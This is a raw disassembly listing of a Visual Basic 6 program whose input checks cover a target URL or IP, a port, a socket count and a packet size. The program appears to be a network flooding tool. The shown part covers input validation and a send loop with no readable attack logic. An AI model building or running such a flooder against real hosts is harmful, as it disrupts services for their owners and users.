007EFCA4: mov var_000000B4, 0000000Ah
007EFCAE: mov var_0000009C, 80020004h
007EFCB8: mov var_000000A4, 0000000Ah
007EFCC2: mov var_00000150, 0045073Ch ; Please just type the direct URL, for example: google.com
007EFCCC: mov var_00000158, 00000008h
007EFCD6: lea edx, var_00000158
007EFCDC: lea ecx, var_00000094
007EFCE2: call 004109E2h ; msvbvm60.dll.__vbaVarDup
007EFCE7: lea eax, var_000000C4
007EFCED: push eax
007EFCEE: lea eax, var_000000B4
007EFCF4: push eax
007EFCF5: lea eax, var_000000A4
007EFCFB: push eax
007EFCFC: push 00000000h
007EFCFE: lea eax, var_00000094
007EFD04: push eax
007EFD05: call 004109E8h ; MsgBox(arg_1, arg_2, arg_3, arg_4, arg_5)
007EFD0A: lea eax, var_000000C4
007EFD10: push eax
007EFD11: lea eax, var_000000B4
007EFD17: push eax
007EFD18: lea eax, var_000000A4
007EFD1E: push eax
007EFD1F: lea eax, var_00000094
007EFD25: push eax
007EFD26: push 00000004h
007EFD28: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007EFD2D: add esp, 00000014h
007EFD30: jmp 007F712Eh
007EFD35: mov var_04, 0000000Eh
007EFD3C: mov eax, [ebp+08h]
007EFD3F: mov eax, [eax]
007EFD41: push [ebp+08h]
007EFD44: call [eax+00000344h]
007EFD4A: push eax
007EFD4B: lea eax, var_70
007EFD4E: push eax
007EFD4F: call 00410A84h ; Set (object)
007EFD54: mov var_000001F0, eax
007EFD5A: lea eax, var_54
007EFD5D: push eax
007EFD5E: mov eax, var_000001F0
007EFD64: mov eax, [eax]
007EFD66: push var_000001F0
007EFD6C: call [eax+000000A0h]
007EFD72: fclex 
007EFD74: mov var_000001F4, eax
007EFD7A: cmp var_000001F4, 00000000h
007EFD81: jnl 7EFDA6h
007EFD83: push 000000A0h
007EFD88: push 00440E08h
007EFD8D: push var_000001F0
007EFD93: push var_000001F4
007EFD99: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007EFD9E: mov var_00000408, eax
007EFDA4: jmp 7EFDADh
007EFDA6: and var_00000408, 00000000h
007EFDAD: push var_54
007EFDB0: call 0041098Eh ; Len(arg_1)
007EFDB5: neg eax
007EFDB7: sbb eax, eax
007EFDB9: inc eax
007EFDBA: neg eax
007EFDBC: mov var_000001F8, ax
007EFDC3: lea ecx, var_54
007EFDC6: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
007EFDCB: lea ecx, var_70
007EFDCE: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007EFDD3: movsx eax, word ptr var_000001F8
007EFDDA: test eax, eax
007EFDDC: jz 007EFE98h
007EFDE2: mov var_04, 0000000Fh
007EFDE9: mov var_000000BC, 80020004h
007EFDF3: mov var_000000C4, 0000000Ah
007EFDFD: mov var_000000AC, 80020004h
007EFE07: mov var_000000B4, 0000000Ah
007EFE11: mov var_0000009C, 80020004h
007EFE1B: mov var_000000A4, 0000000Ah
007EFE25: mov var_00000150, 004507B4h ; Invalid IP
007EFE2F: mov var_00000158, 00000008h
007EFE39: lea edx, var_00000158
007EFE3F: lea ecx, var_00000094
007EFE45: call 004109E2h ; msvbvm60.dll.__vbaVarDup
007EFE4A: lea eax, var_000000C4
007EFE50: push eax
007EFE51: lea eax, var_000000B4
007EFE57: push eax
007EFE58: lea eax, var_000000A4
007EFE5E: push eax
007EFE5F: push 00000030h
007EFE61: lea eax, var_00000094
007EFE67: push eax
007EFE68: call 004109E8h ; MsgBox(arg_1, arg_2, arg_3, arg_4, arg_5)
007EFE6D: lea eax, var_000000C4
007EFE73: push eax
007EFE74: lea eax, var_000000B4
007EFE7A: push eax
007EFE7B: lea eax, var_000000A4
007EFE81: push eax
007EFE82: lea eax, var_00000094
007EFE88: push eax
007EFE89: push 00000004h
007EFE8B: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007EFE90: add esp, 00000014h
007EFE93: jmp 007F712Eh
007EFE98: mov var_04, 00000012h
007EFE9F: mov eax, [ebp+08h]
007EFEA2: mov eax, [eax]
007EFEA4: push [ebp+08h]
007EFEA7: call [eax+00000340h]
007EFEAD: push eax
007EFEAE: lea eax, var_70
007EFEB1: push eax
007EFEB2: call 00410A84h ; Set (object)
007EFEB7: mov var_000001F0, eax
007EFEBD: lea eax, var_54
007EFEC0: push eax
007EFEC1: mov eax, var_000001F0
007EFEC7: mov eax, [eax]
007EFEC9: push var_000001F0
007EFECF: call [eax+000000A0h]
007EFED5: fclex 
007EFED7: mov var_000001F4, eax
007EFEDD: cmp var_000001F4, 00000000h
007EFEE4: jnl 7EFF09h
007EFEE6: push 000000A0h
007EFEEB: push 00440E08h
007EFEF0: push var_000001F0
007EFEF6: push var_000001F4
007EFEFC: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007EFF01: mov var_0000040C, eax
007EFF07: jmp 7EFF10h
007EFF09: and var_0000040C, 00000000h
007EFF10: push var_54
007EFF13: call 004109DCh ; Val(arg_1)
007EFF18: call 004109D6h ; msvbvm60.dll.__vbaFpR8
007EFF1D: fcomp real8 ptr [00401760h]
007EFF23: fstsw ax
007EFF25: sahf 
007EFF26: jnb 7EFF34h
007EFF28: mov var_00000410, 00000001h
007EFF32: jmp 7EFF3Bh
007EFF34: and var_00000410, 00000000h
007EFF3B: mov eax, [ebp+08h]
007EFF3E: mov eax, [eax]
007EFF40: push [ebp+08h]
007EFF43: call [eax+00000340h]
007EFF49: push eax
007EFF4A: lea eax, var_74
007EFF4D: push eax
007EFF4E: call 00410A84h ; Set (object)
007EFF53: mov var_000001F8, eax
007EFF59: lea eax, var_58
007EFF5C: push eax
007EFF5D: mov eax, var_000001F8
007EFF63: mov eax, [eax]
007EFF65: push var_000001F8
007EFF6B: call [eax+000000A0h]
007EFF71: fclex 
007EFF73: mov var_000001FC, eax
007EFF79: cmp var_000001FC, 00000000h
007EFF80: jnl 7EFFA5h
007EFF82: push 000000A0h
007EFF87: push 00440E08h
007EFF8C: push var_000001F8
007EFF92: push var_000001FC
007EFF98: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007EFF9D: mov var_00000414, eax
007EFFA3: jmp 7EFFACh
007EFFA5: and var_00000414, 00000000h
007EFFAC: push var_58
007EFFAF: call 004109DCh ; Val(arg_1)
007EFFB4: call 004109D6h ; msvbvm60.dll.__vbaFpR8
007EFFB9: fcomp real8 ptr [00404788h]
007EFFBF: fstsw ax
007EFFC1: sahf 
007EFFC2: jbe 7EFFD0h
007EFFC4: mov var_00000418, 00000001h
007EFFCE: jmp 7EFFD7h
007EFFD0: and var_00000418, 00000000h
007EFFD7: mov eax, var_00000410
007EFFDD: neg eax
007EFFDF: mov ecx, var_00000418
007EFFE5: neg ecx
007EFFE7: or ax, cx
007EFFEA: mov var_00000200, ax
007EFFF1: lea eax, var_58
007EFFF4: push eax
007EFFF5: lea eax, var_54
007EFFF8: push eax
007EFFF9: push 00000002h
007EFFFB: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
007F0000: add esp, 0000000Ch
007F0003: lea eax, var_74
007F0006: push eax
007F0007: lea eax, var_70
007F000A: push eax
007F000B: push 00000002h
007F000D: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F0012: add esp, 0000000Ch
007F0015: movsx eax, word ptr var_00000200
007F001C: test eax, eax
007F001E: jz 007F00DAh
007F0024: mov var_04, 00000013h
007F002B: mov var_000000BC, 80020004h
007F0035: mov var_000000C4, 0000000Ah
007F003F: mov var_000000AC, 80020004h
007F0049: mov var_000000B4, 0000000Ah
007F0053: mov var_0000009C, 80020004h
007F005D: mov var_000000A4, 0000000Ah
007F0067: mov var_00000150, 004507D0h ; Invalid port
007F0071: mov var_00000158, 00000008h
007F007B: lea edx, var_00000158
007F0081: lea ecx, var_00000094
007F0087: call 004109E2h ; msvbvm60.dll.__vbaVarDup
007F008C: lea eax, var_000000C4
007F0092: push eax
007F0093: lea eax, var_000000B4
007F0099: push eax
007F009A: lea eax, var_000000A4
007F00A0: push eax
007F00A1: push 00000030h
007F00A3: lea eax, var_00000094
007F00A9: push eax
007F00AA: call 004109E8h ; MsgBox(arg_1, arg_2, arg_3, arg_4, arg_5)
007F00AF: lea eax, var_000000C4
007F00B5: push eax
007F00B6: lea eax, var_000000B4
007F00BC: push eax
007F00BD: lea eax, var_000000A4
007F00C3: push eax
007F00C4: lea eax, var_00000094
007F00CA: push eax
007F00CB: push 00000004h
007F00CD: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F00D2: add esp, 00000014h
007F00D5: jmp 007F712Eh
007F00DA: mov var_04, 00000016h
007F00E1: mov eax, [ebp+08h]
007F00E4: mov eax, [eax]
007F00E6: push [ebp+08h]
007F00E9: call [eax+0000033Ch]
007F00EF: push eax
007F00F0: lea eax, var_70
007F00F3: push eax
007F00F4: call 00410A84h ; Set (object)
007F00F9: mov var_000001F0, eax
007F00FF: lea eax, var_54
007F0102: push eax
007F0103: mov eax, var_000001F0
007F0109: mov eax, [eax]
007F010B: push var_000001F0
007F0111: call [eax+000000A0h]
007F0117: fclex 
007F0119: mov var_000001F4, eax
007F011F: cmp var_000001F4, 00000000h
007F0126: jnl 7F014Bh
007F0128: push 000000A0h
007F012D: push 00440E08h
007F0132: push var_000001F0
007F0138: push var_000001F4
007F013E: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F0143: mov var_0000041C, eax
007F0149: jmp 7F0152h
007F014B: and var_0000041C, 00000000h
007F0152: push var_54
007F0155: call 004109DCh ; Val(arg_1)
007F015A: call 004109D6h ; msvbvm60.dll.__vbaFpR8
007F015F: fcomp real8 ptr [00401760h]
007F0165: fstsw ax
007F0167: sahf 
007F0168: jnb 7F0176h
007F016A: mov var_00000420, 00000001h
007F0174: jmp 7F017Dh
007F0176: and var_00000420, 00000000h
007F017D: mov eax, [ebp+08h]
007F0180: mov eax, [eax]
007F0182: push [ebp+08h]
007F0185: call [eax+0000033Ch]
007F018B: push eax
007F018C: lea eax, var_74
007F018F: push eax
007F0190: call 00410A84h ; Set (object)
007F0195: mov var_000001F8, eax
007F019B: lea eax, var_58
007F019E: push eax
007F019F: mov eax, var_000001F8
007F01A5: mov eax, [eax]
007F01A7: push var_000001F8
007F01AD: call [eax+000000A0h]
007F01B3: fclex 
007F01B5: mov var_000001FC, eax
007F01BB: cmp var_000001FC, 00000000h
007F01C2: jnl 7F01E7h
007F01C4: push 000000A0h
007F01C9: push 00440E08h
007F01CE: push var_000001F8
007F01D4: push var_000001FC
007F01DA: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F01DF: mov var_00000424, eax
007F01E5: jmp 7F01EEh
007F01E7: and var_00000424, 00000000h
007F01EE: push var_58
007F01F1: call 004109DCh ; Val(arg_1)
007F01F6: call 004109D6h ; msvbvm60.dll.__vbaFpR8
007F01FB: fcomp real8 ptr [00404780h]
007F0201: fstsw ax
007F0203: sahf 
007F0204: jbe 7F0212h
007F0206: mov var_00000428, 00000001h
007F0210: jmp 7F0219h
007F0212: and var_00000428, 00000000h
007F0219: mov eax, var_00000420
007F021F: neg eax
007F0221: mov ecx, var_00000428
007F0227: neg ecx
007F0229: or ax, cx
007F022C: mov var_00000200, ax
007F0233: lea eax, var_58
007F0236: push eax
007F0237: lea eax, var_54
007F023A: push eax
007F023B: push 00000002h
007F023D: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
007F0242: add esp, 0000000Ch
007F0245: lea eax, var_74
007F0248: push eax
007F0249: lea eax, var_70
007F024C: push eax
007F024D: push 00000002h
007F024F: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F0254: add esp, 0000000Ch
007F0257: movsx eax, word ptr var_00000200
007F025E: test eax, eax
007F0260: jz 007F031Ch
007F0266: mov var_04, 00000017h
007F026D: mov var_000000BC, 80020004h
007F0277: mov var_000000C4, 0000000Ah
007F0281: mov var_000000AC, 80020004h
007F028B: mov var_000000B4, 0000000Ah
007F0295: mov var_0000009C, 80020004h
007F029F: mov var_000000A4, 0000000Ah
007F02A9: mov var_00000150, 004507F0h ; Invalid amount of sockets
007F02B3: mov var_00000158, 00000008h
007F02BD: lea edx, var_00000158
007F02C3: lea ecx, var_00000094
007F02C9: call 004109E2h ; msvbvm60.dll.__vbaVarDup
007F02CE: lea eax, var_000000C4
007F02D4: push eax
007F02D5: lea eax, var_000000B4
007F02DB: push eax
007F02DC: lea eax, var_000000A4
007F02E2: push eax
007F02E3: push 00000030h
007F02E5: lea eax, var_00000094
007F02EB: push eax
007F02EC: call 004109E8h ; MsgBox(arg_1, arg_2, arg_3, arg_4, arg_5)
007F02F1: lea eax, var_000000C4
007F02F7: push eax
007F02F8: lea eax, var_000000B4
007F02FE: push eax
007F02FF: lea eax, var_000000A4
007F0305: push eax
007F0306: lea eax, var_00000094
007F030C: push eax
007F030D: push 00000004h
007F030F: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F0314: add esp, 00000014h
007F0317: jmp 007F712Eh
007F031C: mov var_04, 0000001Ah
007F0323: mov eax, [ebp+08h]
007F0326: mov eax, [eax]
007F0328: push [ebp+08h]
007F032B: call [eax+00000334h]
007F0331: push eax
007F0332: lea eax, var_70
007F0335: push eax
007F0336: call 00410A84h ; Set (object)
007F033B: mov var_000001F0, eax
007F0341: lea eax, var_54
007F0344: push eax
007F0345: mov eax, var_000001F0
007F034B: mov eax, [eax]
007F034D: push var_000001F0
007F0353: call [eax+000000A0h]
007F0359: fclex 
007F035B: mov var_000001F4, eax
007F0361: cmp var_000001F4, 00000000h
007F0368: jnl 7F038Dh
007F036A: push 000000A0h
007F036F: push 00440E08h
007F0374: push var_000001F0
007F037A: push var_000001F4
007F0380: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F0385: mov var_0000042C, eax
007F038B: jmp 7F0394h
007F038D: and var_0000042C, 00000000h
007F0394: push var_54
007F0397: call 004109DCh ; Val(arg_1)
007F039C: call 004109D6h ; msvbvm60.dll.__vbaFpR8
007F03A1: fcomp real8 ptr [00401760h]
007F03A7: fstsw ax
007F03A9: sahf 
007F03AA: jnb 7F03B8h
007F03AC: mov var_00000430, 00000001h
007F03B6: jmp 7F03BFh
007F03B8: and var_00000430, 00000000h
007F03BF: mov eax, [ebp+08h]
007F03C2: mov eax, [eax]
007F03C4: push [ebp+08h]
007F03C7: call [eax+00000334h]
007F03CD: push eax
007F03CE: lea eax, var_74
007F03D1: push eax
007F03D2: call 00410A84h ; Set (object)
007F03D7: mov var_000001F8, eax
007F03DD: lea eax, var_58
007F03E0: push eax
007F03E1: mov eax, var_000001F8
007F03E7: mov eax, [eax]
007F03E9: push var_000001F8
007F03EF: call [eax+000000A0h]
007F03F5: fclex 
007F03F7: mov var_000001FC, eax
007F03FD: cmp var_000001FC, 00000000h
007F0404: jnl 7F0429h
007F0406: push 000000A0h
007F040B: push 00440E08h
007F0410: push var_000001F8
007F0416: push var_000001FC
007F041C: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F0421: mov var_00000434, eax
007F0427: jmp 7F0430h
007F0429: and var_00000434, 00000000h
007F0430: push var_58
007F0433: call 004109DCh ; Val(arg_1)
007F0438: call 004109D6h ; msvbvm60.dll.__vbaFpR8
007F043D: fcomp real8 ptr [00401750h]
007F0443: fstsw ax
007F0445: sahf 
007F0446: jbe 7F0454h
007F0448: mov var_00000438, 00000001h
007F0452: jmp 7F045Bh
007F0454: and var_00000438, 00000000h
007F045B: mov eax, var_00000430
007F0461: neg eax
007F0463: mov ecx, var_00000438
007F0469: neg ecx
007F046B: or ax, cx
007F046E: mov var_00000200, ax
007F0475: lea eax, var_58
007F0478: push eax
007F0479: lea eax, var_54
007F047C: push eax
007F047D: push 00000002h
007F047F: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
007F0484: add esp, 0000000Ch
007F0487: lea eax, var_74
007F048A: push eax
007F048B: lea eax, var_70
007F048E: push eax
007F048F: push 00000002h
007F0491: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F0496: add esp, 0000000Ch
007F0499: movsx eax, word ptr var_00000200
007F04A0: test eax, eax
007F04A2: jz 007F055Eh
007F04A8: mov var_04, 0000001Bh
007F04AF: mov var_000000BC, 80020004h
007F04B9: mov var_000000C4, 0000000Ah
007F04C3: mov var_000000AC, 80020004h
007F04CD: mov var_000000B4, 0000000Ah
007F04D7: mov var_0000009C, 80020004h
007F04E1: mov var_000000A4, 0000000Ah
007F04EB: mov var_00000150, 00450828h ; Invalid packet size
007F04F5: mov var_00000158, 00000008h
007F04FF: lea edx, var_00000158
007F0505: lea ecx, var_00000094
007F050B: call 004109E2h ; msvbvm60.dll.__vbaVarDup
007F0510: lea eax, var_000000C4
007F0516: push eax
007F0517: lea eax, var_000000B4
007F051D: push eax
007F051E: lea eax, var_000000A4
007F0524: push eax
007F0525: push 00000030h
007F0527: lea eax, var_00000094
007F052D: push eax
007F052E: call 004109E8h ; MsgBox(arg_1, arg_2, arg_3, arg_4, arg_5)
007F0533: lea eax, var_000000C4
007F0539: push eax
007F053A: lea eax, var_000000B4
007F0540: push eax
007F0541: lea eax, var_000000A4
007F0547: push eax
007F0548: lea eax, var_00000094
007F054E: push eax
007F054F: push 00000004h
007F0551: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F0556: add esp, 00000014h
007F0559: jmp 007F712Eh
007F055E: mov var_04, 0000001Eh
007F0565: mov eax, [ebp+08h]
007F0568: mov eax, [eax]
007F056A: push [ebp+08h]
007F056D: call [eax+00000338h]
007F0573: push eax
007F0574: lea eax, var_70
007F0577: push eax
007F0578: call 00410A84h ; Set (object)
007F057D: mov var_000001F0, eax
007F0583: lea eax, var_000001CC
007F0589: push eax
007F058A: mov eax, var_000001F0
007F0590: mov eax, [eax]
007F0592: push var_000001F0
007F0598: call [eax+00000088h]
007F059E: fclex 
007F05A0: mov var_000001F4, eax
007F05A6: cmp var_000001F4, 00000000h
007F05AD: jnl 7F05D2h
007F05AF: push 00000088h
007F05B4: push 00440E08h
007F05B9: push var_000001F0
007F05BF: push var_000001F4
007F05C5: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F05CA: mov var_0000043C, eax
007F05D0: jmp 7F05D9h
007F05D2: and var_0000043C, 00000000h
007F05D9: xor eax, eax
007F05DB: cmp word ptr var_000001CC, FFFFh
007F05E3: setz al
007F05E6: neg eax
007F05E8: mov var_000001F8, ax
007F05EF: lea ecx, var_70
007F05F2: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007F05F7: movsx eax, word ptr var_000001F8
007F05FE: test eax, eax
007F0600: jz 007F06B8h
007F0606: mov var_04, 0000001Fh
007F060D: mov eax, [ebp+08h]
007F0610: mov eax, [eax]
007F0612: push [ebp+08h]
007F0615: call [eax+00000338h]
007F061B: push eax
007F061C: lea eax, var_70
007F061F: push eax
007F0620: call 00410A84h ; Set (object)
007F0625: mov var_000001F0, eax
007F062B: lea eax, var_54
007F062E: push eax
007F062F: mov eax, var_000001F0
007F0635: mov eax, [eax]
007F0637: push var_000001F0
007F063D: call [eax+000000A0h]
007F0643: fclex 
007F0645: mov var_000001F4, eax
007F064B: cmp var_000001F4, 00000000h
007F0652: jnl 7F0677h
007F0654: push 000000A0h
007F0659: push 00440E08h
007F065E: push var_000001F0
007F0664: push var_000001F4
007F066A: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F066F: mov var_00000440, eax
007F0675: jmp 7F067Eh
007F0677: and var_00000440, 00000000h
007F067E: mov eax, var_54
007F0681: mov var_000003B8, eax
007F0687: and var_54, 00000000h
007F068B: mov edx, var_000003B8
007F0691: lea ecx, var_44
007F0694: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F0699: lea ecx, var_70
007F069C: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007F06A1: mov var_04, 00000020h
007F06A8: push var_44
007F06AB: call 0041098Eh ; Len(arg_1)
007F06B0: mov var_34, eax
007F06B3: jmp 007F0764h
007F06B8: mov var_04, 00000022h
007F06BF: mov edx, 0044AD8Ch ; rd
007F06C4: lea ecx, var_44
007F06C7: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
007F06CC: mov var_04, 00000023h
007F06D3: mov eax, [ebp+08h]
007F06D6: mov eax, [eax]
007F06D8: push [ebp+08h]
007F06DB: call [eax+00000334h]
007F06E1: push eax
007F06E2: lea eax, var_70
007F06E5: push eax
007F06E6: call 00410A84h ; Set (object)
007F06EB: mov var_000001F0, eax
007F06F1: lea eax, var_54
007F06F4: push eax
007F06F5: mov eax, var_000001F0
007F06FB: mov eax, [eax]
007F06FD: push var_000001F0
007F0703: call [eax+000000A0h]
007F0709: fclex 
007F070B: mov var_000001F4, eax
007F0711: cmp var_000001F4, 00000000h
007F0718: jnl 7F073Dh
007F071A: push 000000A0h
007F071F: push 00440E08h
007F0724: push var_000001F0
007F072A: push var_000001F4
007F0730: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F0735: mov var_00000444, eax
007F073B: jmp 7F0744h
007F073D: and var_00000444, 00000000h
007F0744: push var_54
007F0747: call 004109DCh ; Val(arg_1)
007F074C: call 00410814h ; msvbvm60.dll.__vbaFpI4
007F0751: mov var_34, eax
007F0754: lea ecx, var_54
007F0757: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
007F075C: lea ecx, var_70
007F075F: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007F0764: mov var_04, 00000025h
007F076B: push 00000000h
007F076D: push 00000000h
007F076F: mov eax, [ebp+08h]
007F0772: mov eax, [eax]
007F0774: push [ebp+08h]
007F0777: call [eax+00000368h]
007F077D: push eax
007F077E: lea eax, var_70
007F0781: push eax
007F0782: call 00410A84h ; Set (object)
007F0787: push eax
007F0788: lea eax, var_00000094
007F078E: push eax
007F078F: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F0794: add esp, 00000010h
007F0797: push eax
007F0798: call 00410A90h ; msvbvm60.dll.__vbaI4Var
007F079D: dec eax
007F079E: neg eax
007F07A0: sbb eax, eax
007F07A2: inc eax
007F07A3: neg eax
007F07A5: mov var_000001F0, ax
007F07AC: lea ecx, var_70
007F07AF: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007F07B4: lea ecx, var_00000094
007F07BA: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007F07BF: movsx eax, word ptr var_000001F0
007F07C6: test eax, eax
007F07C8: jz 007F4B7Ch
007F07CE: mov var_04, 00000027h
007F07D5: mov var_00000150, 00000001h
007F07DF: mov var_00000158, 00000002h
007F07E9: cmp [008F2410h], 00000000h
007F07F0: jnz 7F080Dh
007F07F2: push 008F2410h
007F07F7: push 00440E38h
007F07FC: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F0801: mov var_00000448, 008F2410h
007F080B: jmp 7F0817h
007F080D: mov var_00000448, 008F2410h
007F0817: mov eax, var_00000448
007F081D: mov eax, [eax]
007F081F: mov var_000001F0, eax
007F0825: lea eax, var_000001DC
007F082B: push eax
007F082C: mov eax, var_000001F0
007F0832: mov eax, [eax]
007F0834: push var_000001F0
007F083A: call [eax+24h]
007F083D: fclex 
007F083F: mov var_000001F4, eax
007F0845: cmp var_000001F4, 00000000h
007F084C: jnl 7F086Eh
007F084E: push 00000024h
007F0850: push 00440E28h
007F0855: push var_000001F0
007F085B: push var_000001F4
007F0861: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F0866: mov var_0000044C, eax
007F086C: jmp 7F0875h
007F086E: and var_0000044C, 00000000h
007F0875: mov eax, var_000001DC
007F087B: mov var_00000160, eax
007F0881: mov var_00000168, 00000003h
007F088B: mov var_00000170, 00000001h
007F0895: mov var_00000178, 00000002h
007F089F: lea eax, var_00000158
007F08A5: push eax
007F08A6: lea eax, var_00000168
007F08AC: push eax
007F08AD: lea eax, var_00000178
007F08B3: push eax
007F08B4: lea eax, var_00000240
007F08BA: push eax
007F08BB: lea eax, var_00000230
007F08C1: push eax
007F08C2: lea eax, var_30
007F08C5: push eax
007F08C6: call 00410A3Ch ; For
007F08CB: mov var_000003BC, eax
007F08D1: jmp 007F0B14h
007F08D6: mov var_04, 00000028h
007F08DD: cmp [008F2410h], 00000000h
007F08E4: jnz 7F0901h
007F08E6: push 008F2410h
007F08EB: push 00440E38h
007F08F0: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F08F5: mov var_00000450, 008F2410h
007F08FF: jmp 7F090Bh
007F0901: mov var_00000450, 008F2410h
007F090B: mov eax, var_00000450
007F0911: mov eax, [eax]
007F0913: mov var_000001F0, eax
007F0919: lea eax, var_00000094
007F091F: push eax
007F0920: lea eax, var_30
007F0923: push eax
007F0924: mov eax, var_000001F0
007F092A: mov eax, [eax]
007F092C: push var_000001F0
007F0932: call [eax+1Ch]
007F0935: fclex 
007F0937: mov var_000001F4, eax
007F093D: cmp var_000001F4, 00000000h
007F0944: jnl 7F0966h
007F0946: push 0000001Ch
007F0948: push 00440E28h
007F094D: push var_000001F0
007F0953: push var_000001F4
007F0959: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F095E: mov var_00000454, eax
007F0964: jmp 7F096Dh
007F0966: and var_00000454, 00000000h
007F096D: lea eax, var_00000094
007F0973: push eax
007F0974: lea eax, var_54
007F0977: push eax
007F0978: call 0041097Ch ; msvbvm60.dll.__vbaStrVarVal
007F097D: push eax
007F097E: call 004109DCh ; Val(arg_1)
007F0983: fstp real8 ptr var_000001E4
007F0989: push 00000000h
007F098B: push 00000001h
007F098D: push 00000001h
007F098F: push 00000000h
007F0991: lea eax, var_00000148
007F0997: push eax
007F0998: push 00000010h
007F099A: push 00000880h
007F099F: call 00410946h ; ReDim
007F09A4: add esp, 0000001Ch
007F09A7: mov var_00000150, 00442930h
007F09B1: mov var_00000158, 00000008h
007F09BB: lea esi, var_00000158
007F09C1: push 00000000h
007F09C3: push var_00000148
007F09C9: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F09CE: mov ecx, eax
007F09D0: mov edx, esi
007F09D2: call 004108F2h ; msvbvm60.dll.__vbaVarCopy
007F09D7: mov var_00000160, 00442BFCh
007F09E1: mov var_00000168, 00000008h
007F09EB: lea esi, var_00000168
007F09F1: push 00000001h
007F09F3: push var_00000148
007F09F9: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F09FE: mov ecx, eax
007F0A00: mov edx, esi
007F0A02: call 004108F2h ; msvbvm60.dll.__vbaVarCopy
007F0A07: mov edx, 0043D464h ; x7
007F0A0C: lea ecx, var_58
007F0A0F: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
007F0A14: lea eax, var_00000148
007F0A1A: push eax
007F0A1B: lea eax, var_58
007F0A1E: push eax
007F0A1F: fld real8 ptr var_000001E4
007F0A25: call 004108E6h ; msvbvm60.dll.__vbaFpI2
007F0A2A: push eax
007F0A2B: call 007A6910h
007F0A30: lea eax, var_00000148
007F0A36: push eax
007F0A37: push 00000000h
007F0A39: call 00410934h ; Erase
007F0A3E: lea eax, var_58
007F0A41: push eax
007F0A42: lea eax, var_54
007F0A45: push eax
007F0A46: push 00000002h
007F0A48: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
007F0A4D: add esp, 0000000Ch
007F0A50: lea ecx, var_00000094
007F0A56: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007F0A5B: mov var_04, 00000029h
007F0A62: cmp [008F2410h], 00000000h
007F0A69: jnz 7F0A86h
007F0A6B: push 008F2410h
007F0A70: push 00440E38h
007F0A75: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F0A7A: mov var_00000458, 008F2410h
007F0A84: jmp 7F0A90h
007F0A86: mov var_00000458, 008F2410h
007F0A90: mov eax, var_00000458
007F0A96: mov eax, [eax]
007F0A98: mov var_000001F0, eax
007F0A9E: lea eax, var_30
007F0AA1: push eax
007F0AA2: mov eax, var_000001F0
007F0AA8: mov eax, [eax]
007F0AAA: push var_000001F0
007F0AB0: call [eax+28h]
007F0AB3: fclex 
007F0AB5: mov var_000001F4, eax
007F0ABB: cmp var_000001F4, 00000000h
007F0AC2: jnl 7F0AE4h
007F0AC4: push 00000028h
007F0AC6: push 00440E28h
007F0ACB: push var_000001F0
007F0AD1: push var_000001F4
007F0AD7: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F0ADC: mov var_0000045C, eax
007F0AE2: jmp 7F0AEBh
007F0AE4: and var_0000045C, 00000000h
007F0AEB: jmp 007F07CEh
007F0AF0: mov var_04, 0000002Bh
007F0AF7: lea eax, var_00000240
007F0AFD: push eax
007F0AFE: lea eax, var_00000230
007F0B04: push eax
007F0B05: lea eax, var_30
007F0B08: push eax
007F0B09: call 00410A36h ; Next
007F0B0E: mov var_000003BC, eax
007F0B14: cmp var_000003BC, 00000000h
007F0B1B: jnz 007F08D6h
007F0B21: mov var_04, 0000002Ch
007F0B28: call 007A879Eh
007F0B2D: mov var_04, 0000002Dh
007F0B34: push 00000000h
007F0B36: push 00000000h
007F0B38: mov eax, [ebp+08h]
007F0B3B: mov eax, [eax]
007F0B3D: push [ebp+08h]
007F0B40: call [eax+0000036Ch]
007F0B46: push eax
007F0B47: lea eax, var_70
007F0B4A: push eax
007F0B4B: call 00410A84h ; Set (object)
007F0B50: push eax
007F0B51: lea eax, var_00000094
007F0B57: push eax
007F0B58: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F0B5D: add esp, 00000010h
007F0B60: push eax
007F0B61: call 00410A90h ; msvbvm60.dll.__vbaI4Var
007F0B66: dec eax
007F0B67: neg eax
007F0B69: sbb eax, eax
007F0B6B: inc eax
007F0B6C: neg eax
